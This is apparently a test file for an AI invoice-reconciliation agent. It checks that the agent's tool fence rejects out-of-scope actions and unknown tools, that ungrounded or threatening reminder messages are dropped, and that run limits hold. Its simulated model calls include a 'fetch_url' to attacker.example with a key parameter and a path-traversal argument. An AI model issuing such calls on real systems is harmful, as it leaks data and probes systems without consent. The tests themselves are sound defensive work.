// SPDX-License-Identifier: MIT
/**
 * A2, the desk agent, in the reconciler's world (L2): it reads with its tools, proposes inside the fence only, keeps a
 * message only when its amounts, dates and invoice numbers are the typed facts of its own twin, stops at its limits, and leaves the reconciler's own
 * proposals standing whenever the model fails (the manual path).
 */
import { describe, expect, it } from "vitest";
import { DESK_LIMITS } from "../../src/ai/desk/agent.ts";
import { checkMessage, factsOfTwin, NO_FACTS } from "../../src/ai/desk/grounding.ts";
import type { GroundFacts } from "../../src/ai/desk/grounding.ts";
import { DESK_TOOL_NAMES, usdOf } from "../../src/ai/desk/tools.ts";
import type { ToolTurnRequest } from "../../src/ai/types.ts";
import { B_KEY, calls, deskWorld, KEY, lastResults, nth, OTHER_KEY, PAYEE, proposals, says } from "./support.ts";

const REMINDER = "Hello, a friendly reminder: invoice PL-11155111-abababababab for 120.00 USD is due on 2026-11-06. Thank you!";

describe("desk agent: the happy path", () => {
  it("reads, asks the fence, proposes inside it with a grounded message, and the desk shows it", async () => {
    const d = await deskWorld();
    const seen: ToolTurnRequest[] = [];
    const ai = d.model([
      (r) => (seen.push(r), calls(["list_invoices", {}])),
      (r) => (seen.push(r), calls(["allowed_actions", { invoice_key: KEY }], ["allowed_actions", { invoice_key: B_KEY }])),
      (r) => (seen.push(r), calls(["propose_action", { kind: "share_reminder_text", invoice_key: KEY, message: REMINDER, message_language: "en" }], ["propose_action", { kind: "cancel_paypal", invoice_key: B_KEY }])),
      (r) => (seen.push(r), says("I proposed one reminder and closing one PayPal invoice.")),
    ]);
    const desk = await d.run(ai);
    expect(desk.assistant).toEqual({ available: true, reason: null });
    expect(proposals(desk)).toEqual(
      expect.arrayContaining([
        ["share_reminder_text", KEY, "reconciler", REMINDER],
        ["cancel_paypal", B_KEY, "reconciler", null],
      ]),
    );
    expect(d.reports).toEqual([{ turns: 4, toolCalls: 5, proposed: 2, refusedByFence: 0, messagesDropped: 0, ending: "done" }]);
    // What the model saw: the toolkit-shaped invoice list, then the fence with exact values.
    const [list] = lastResults(nth(seen, 1)) as [{ items: { invoice_number: string; amount: { value: string } }[] }];
    expect(list.items.map((i) => [i.invoice_number, i.amount.value])).toEqual([
      ["PL-11155111-abababababab", "120.00"],
      ["PL-11155111-efefefefefef", "120.00"],
    ]);
    const [fence] = lastResults(nth(seen, 2)) as [{ actions: { kind: string; proposable: boolean; values: Record<string, string> }[] }];
    expect(fence.actions).toEqual([{ kind: "share_reminder_text", proposable: true, reason_code: "share-reminder", values: { invoice: "PL-11155111-abababababab", amount: "120.00", currency: "USD", due: "2026-11-06" } }]);
    // No PayPal write happened: proposals wait for the payee's tap (AI-3).
    expect(d.w.paypal.writes()).toEqual([]);
  });

  it("no open twin: no model call at all", async () => {
    const d = await deskWorld();
    const ai = d.model([says("never")]);
    const { sweep } = await import("../../src/reconciler/desk.ts");
    const { createDeskAgent } = await import("../../src/ai/desk/agent.ts");
    const other = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";
    const desk = await sweep({ ...d.w.services, ai }, other, d.w.clock.now, createDeskAgent());
    expect(desk.assistant).toEqual({ available: true, reason: null });
    expect(ai.toolTurnRequests).toHaveLength(0);
  });
});

describe("desk agent: the fence holds whatever the model asks", () => {
  it("refuses kinds, twins and values outside the fence, and says why", async () => {
    const d = await deskWorld();
    let results: unknown[] = [];
    const ai = d.model([
      calls(
        ["propose_action", { kind: "cancel_paylink", invoice_key: KEY }],
        ["propose_action", { kind: "send_reminder", invoice_key: KEY }],
        ["propose_action", { kind: "record_external_payment", invoice_key: KEY }],
        ["propose_action", { kind: "create_refund", invoice_key: KEY }],
        ["propose_action", { kind: "share_reminder_text", invoice_key: KEY, args: { amount: "1.00" } }],
        ["propose_action", { kind: "share_reminder_text", invoice_key: OTHER_KEY }],
        ["propose_action", { kind: "share_reminder_text", invoice_key: KEY, payee: "0x000000000000000000000000000000000000dEaD" }],
      ),
      (r) => ((results = lastResults(r)), says("done")),
    ]);
    const desk = await d.run(ai);
    expect(results).toEqual([
      { status: "rejected", reason: "outside-fence" },
      { status: "rejected", reason: "outside-fence" },
      { status: "rejected", reason: "outside-fence" },
      { status: "rejected", reason: "unknown-kind" },
      { status: "rejected", reason: "values-differ" },
      { status: "rejected", reason: "unknown-twin" },
      { status: "rejected", reason: "invalid_arguments" },
    ]);
    expect(proposals(desk).map(([kind, key]) => `${kind}:${key.slice(0, 6)}`).sort()).toEqual(["cancel_paypal:0xefef", "share_reminder_text:0xabab"]);
    expect(d.reports[0]).toMatchObject({ proposed: 0, refusedByFence: 7 });
    expect(d.w.lines.filter((l) => l.includes('"fence.reject"'))).toHaveLength(6);
    expect(d.w.paypal.writes()).toEqual([]);
  });

  it("answers an unknown tool with the allowlist, and nothing else happens", async () => {
    const d = await deskWorld();
    let results: unknown[] = [];
    const ai = d.model([
      calls(["create_refund", { invoice_id: "INV2-A", amount: "120.00" }], ["pay_order", { order_id: "X" }], ["fetch_url", { url: "https://attacker.example/?k=" }], ["send_invoice_reminder", { invoice_id: "INV2-A" }]),
      (r) => ((results = lastResults(r)), says("done")),
    ]);
    await d.run(ai);
    for (const result of results) {
      expect(result).toEqual({ error: "unknown_tool", allowed: DESK_TOOL_NAMES });
    }
    expect(d.w.paypal.writes()).toEqual([]);
    expect(d.w.lines.filter((l) => l.includes('"a2.unknown-tool"'))).toHaveLength(4);
  });

  it("bad arguments are errors for the model, never exceptions", async () => {
    const d = await deskWorld();
    let results: unknown[] = [];
    const ai = d.model([calls(["get_invoice", "{not json"], ["get_invoice", { invoice_id: "../../v2/invoicing" }], ["get_invoice", { invoice_id: "INV2-NOT-MINE" }], ["search_invoicing", { resource_type: "recurring_series" }], ["list_invoices", "x".repeat(5000)]), (r) => ((results = lastResults(r)), says("done"))]);
    await d.run(ai);
    expect(results).toEqual([{ error: "arguments_not_json" }, { error: "invalid_arguments" }, { error: "not_found" }, { error: "invalid_arguments" }, { error: "arguments_too_large" }]);
  });
});

describe("desk agent: messages", () => {
  it("drops a message with a number the tool data does not hold, a link or a threat; the proposal stays, with fixed text", async () => {
    for (const message of ["Please pay 500 USD for invoice PL-11155111-abababababab.", "Pay here: https://pay.example/abc", "Pay now or my lawyer will call.", "Send it to 0x70997970C51812dc3A010C7d01b50e0d17dc79C8"]) {
      const d = await deskWorld();
      const ai = d.model([calls(["list_invoices", {}]), calls(["propose_action", { kind: "share_reminder_text", invoice_key: KEY, message }]), says("done")]);
      const desk = await d.run(ai);
      expect(proposals(desk).find(([kind, key]) => kind === "share_reminder_text" && key === KEY)?.[3], message).toBeNull();
      expect(d.reports[0], message).toMatchObject({ proposed: 1, messagesDropped: 1 });
    }
  });

  it("a message written before any read has nothing to be grounded in", async () => {
    const d = await deskWorld();
    const ai = d.model([calls(["propose_action", { kind: "share_reminder_text", invoice_key: KEY, message: "Invoice of 120.00 USD." }]), says("done")]);
    await d.run(ai);
    expect(d.reports[0]).toMatchObject({ messagesDropped: 1 });
  });

  it("grounding compares values, not spellings, and only the twin's own typed values", () => {
    const facts: GroundFacts = { amounts: new Set(["1200000000"]), dates: new Set(["2026-11-06", "2026-10-21"]), invoiceNumbers: new Set(["pl-11155111-3fa9c0e17b2d"]) };
    for (const ok of [
      "1,200.00 USD due 06/11/2026 (PL-11155111-3fa9c0e17b2d)",
      "1 200 USD, le 6 novembre 2026",
      "Rappel : la facture PL-11155111-3fa9c0e17b2d de 1 200,00 USD est due le 6 novembre.",
      "$1,200 due November 6th, 2026, shared on 2026-10-21.",
      "Faktiora PL-11155111-3fa9c0e17b2d: 1200 USD, 6 novambra 2026.",
    ]) {
      expect(checkMessage(ok, facts), ok).toMatchObject({ grounded: true });
    }
    expect(checkMessage("1,250 USD", facts)).toMatchObject({ grounded: false, problems: ["ungrounded-number"], ungrounded: ["1250"] });
    expect(checkMessage("1.200 USD", facts).problems).toEqual(["ungrounded-number"]);
    expect(checkMessage("1,200.00 EUR", facts).problems).toEqual(["ungrounded-number"]);
    expect(checkMessage("1,200.00 USD due 2026-11-07", facts)).toMatchObject({ problems: ["ungrounded-date"] });
    expect(checkMessage("Invoice PL-11155111-0000000000aa: 1,200.00 USD", facts)).toMatchObject({ problems: ["ungrounded-invoice-number"] });
    expect(checkMessage("1,200.00 USD, 11155111 or USD47 or ١٢٠", facts).problems).toEqual(["ungrounded-number"]);
    expect(checkMessage("Invoice of 1,200.00 USD, now 3 days late (12:00).", facts).ungrounded).toEqual(["3", "12", "0"]);
    expect(checkMessage("1,200.00 USD", NO_FACTS).problems).toEqual(["ungrounded-number"]);
    expect(checkMessage("x".repeat(401), facts).problems).toEqual(["too-long"]);
    expect(usdOf("120000000")).toBe("120.00");
    expect(usdOf("5")).toBe("0.00");
  });

  it("AI-5 probes: a wrong amount built from digits of keys, hashes, the chain id or checked_at is dropped", async () => {
    // The review's probes (2026-10-22): each was kept with grounded: true when the ground was every digit of every tool
    // result. 12 is checked_at's hour, 2026 the year, 21 the day, 47 a minute, 60/817/8175 digits of a hex key.
    const probes = [
      "Hello, a reminder: invoice PL-11155111-abababababab for 12.00 USD is due on 2026-11-06.",
      "Hello, a reminder: invoice PL-11155111-abababababab for 2,026.00 USD is due on 2026-11-06.",
      "Hello, a reminder: invoice PL-11155111-abababababab for 21 USD is due on 2026-11-06.",
      "Hello, the invoice for 47 USD is now due.",
      "Hello, the invoice PL-11155111-abababababab of 120.00 USD (ref 8175, 60) is due.",
    ];
    for (const message of probes) {
      const d = await deskWorld();
      const ai = d.model([calls(["list_invoices", {}], ["chain_invoice_state", { invoice_key: KEY }], ["allowed_actions", { invoice_key: KEY }]), calls(["propose_action", { kind: "share_reminder_text", invoice_key: KEY, message }]), says("done")]);
      const desk = await d.run(ai);
      expect(proposals(desk).find(([kind, key]) => kind === "share_reminder_text" && key === KEY)?.[3], message).toBeNull();
      expect(d.reports[0], message).toMatchObject({ proposed: 1, messagesDropped: 1 });
      const twin = await d.w.services.stores.payee(PAYEE).getTwin(KEY);
      expect(twin === null ? null : checkMessage(message, factsOfTwin(twin)).grounded, message).toBe(false);
    }
  });

  it("a reminder for invoice A that states invoice B's amount, date or number is dropped; A's own values are kept", async () => {
    const d = await deskWorld();
    const store = d.w.services.stores.payee(PAYEE);
    const before = await store.getTwin(B_KEY);
    const a = await store.getTwin(KEY);
    if (a === null || before === null) {
      throw new Error("the desk world has twins A and B");
    }
    const b = { ...before, amountBase: "99000000", dueDate: "2026-12-01" };
    await store.putTwin(b);
    const facts = factsOfTwin(a);
    expect(checkMessage(`Invoice ${a.invoiceNumber} for 99.00 USD is due on 2026-11-06.`, facts).problems).toEqual(["ungrounded-number"]);
    expect(checkMessage(`Invoice ${a.invoiceNumber} for 120.00 USD is due on 2026-12-01.`, facts).problems).toEqual(["ungrounded-date"]);
    expect(checkMessage(`Invoice ${b.invoiceNumber} for 120.00 USD is due on 2026-11-06.`, facts).problems).toEqual(["ungrounded-invoice-number"]);
    expect(checkMessage(`Invoice ${a.invoiceNumber} for 120.00 USD is due on 2026-11-06.`, facts).grounded).toBe(true);
  });

  it("the fence checks the text again against the twin: a caller that claims 'grounded' cannot store a wrong amount", async () => {
    const d = await deskWorld();
    const { proposeFromAssistant } = await import("../../src/reconciler/desk.ts");
    await d.run(d.model([says("done")]));
    const outcome = await proposeFromAssistant(d.w.services, PAYEE, { kind: "share_reminder_text", key: KEY, message: { text: "Invoice PL-11155111-abababababab for 12.00 USD.", language: "en", grounded: true } }, d.w.clock.now);
    expect(outcome.outcome).toBe("queued");
    const stored = (await d.w.services.stores.payee(PAYEE).listProposals({ states: ["open"] })).find((p) => p.kind === "share_reminder_text" && p.key === KEY);
    expect(stored?.message).toBeNull();
  });
});

describe("desk agent: limits and failures (the manual path)", () => {
  it("stops at 12 tool calls", async () => {
    const d = await deskWorld();
    const ai = d.model(Array.from({ length: 10 }, () => calls(["list_invoices", {}], ["list_invoices", {}], ["list_invoices", {}])));
    const desk = await d.run(ai);
    expect(desk.assistant).toEqual({ available: true, reason: null });
    expect(d.reports[0]).toMatchObject({ ending: "tool-call-limit", toolCalls: 15, turns: 5 });
    expect(ai.toolTurnRequests).toHaveLength(5);
  });

  it("stops at 6 turns", async () => {
    const d = await deskWorld();
    const ai = d.model(Array.from({ length: 10 }, () => calls(["list_invoices", {}])));
    await d.run(ai);
    expect(d.reports[0]).toMatchObject({ ending: "turn-limit", turns: DESK_LIMITS.turns });
    expect(ai.toolTurnRequests).toHaveLength(DESK_LIMITS.turns);
  });

  it("at most 5 proposals in a run", async () => {
    const d = await deskWorld();
    let results: unknown[] = [];
    const six = Array.from({ length: 6 }, () => ["propose_action", { kind: "share_reminder_text", invoice_key: KEY }] as const);
    const ai = d.model([calls(...six), (r) => ((results = lastResults(r)), says("done"))]);
    await d.run(ai);
    expect(results.at(-1)).toEqual({ status: "rejected", reason: "proposal_limit" });
  });

  it("a refusal, a cut-off, a timeout or an answer out of shape ends the run; the reconciler's proposals stand", async () => {
    for (const failure of [{ outcome: "refused" }, { outcome: "truncated" }, { outcome: "timeout" }, { outcome: "invalid-output" }] as const) {
      const d = await deskWorld();
      const desk = await d.run(d.model([calls(["list_invoices", {}]), failure]));
      expect(desk.assistant, failure.outcome).toEqual({ available: false, reason: "error" });
      expect(d.reports[0]?.ending).toBe(failure.outcome);
      expect(proposals(desk).map(([kind]) => kind).sort()).toEqual(["cancel_paypal", "share_reminder_text"]);
    }
  });

  it("a spent budget is 'resting'; a disabled assistant never calls a model", async () => {
    const d = await deskWorld();
    expect((await d.run(d.model([{ outcome: "unavailable", reason: "budget" }]))).assistant).toEqual({ available: false, reason: "resting" });
    const never = d.model([]);
    expect((await d.run({ ...never, kind: "disabled" })).assistant).toEqual({ available: false, reason: "disabled" });
  });

  it("the payee's daily assistant quota rests the desk too", async () => {
    const d = await deskWorld();
    const services = d.w.services;
    const day = new Date(d.w.clock.now).toISOString().slice(0, 10);
    for (let i = 0; i < services.runtime.config.quotas.aiCallsPerDay; i += 1) {
      await services.stores.payee("0x70997970C51812dc3A010C7d01b50e0d17dc79C8").useQuota(day, "aiCalls", services.runtime.config.quotas.aiCallsPerDay);
    }
    const ai = d.model([says("never")]);
    expect((await d.run(ai)).assistant).toEqual({ available: false, reason: "resting" });
    expect(ai.toolTurnRequests).toHaveLength(0);
  });
});
